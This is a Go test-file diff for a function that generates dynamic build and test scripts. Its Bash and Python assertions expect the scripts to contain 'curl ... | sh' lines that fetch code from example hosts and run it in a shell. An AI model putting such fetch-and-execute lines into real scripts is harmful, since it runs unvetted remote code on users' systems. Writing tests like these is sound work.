@@ -630,7 +630,7 @@ func TestDynamicScriptFiles_Bash(t *testing.T) {
 	assert.Equal(t, "scripts/build.sh", files[0].path)
 	assert.Equal(t, "scripts/test.sh", files[1].path)
 	assert.Contains(t, files[0].content, "#!/bin/sh")
-	assert.Contains(t, files[0].content, "curl -s http://kitchen.example.com/r/abc | sh")
+	assert.Contains(t, files[0].content, "curl -s 'http://kitchen.example.com/r/abc' | sh")
 }
 
 func TestDynamicScriptFiles_Powershell(t *testing.T) {
@@ -648,7 +648,7 @@ func TestDynamicScriptFiles_Python(t *testing.T) {
 	require.Len(t, files, 1)
 	assert.Contains(t, files[0].content, "#!/usr/bin/env python3")
 	assert.Contains(t, files[0].content, "os.system")
-	assert.Contains(t, files[0].content, "http://k.example.com/r/y")
+	assert.Contains(t, files[0].content, "curl -s 'http://k.example.com/r/y' | sh")
 }
 
 func TestDynamicScriptFiles_EmptyTargets(t *testing.T) {
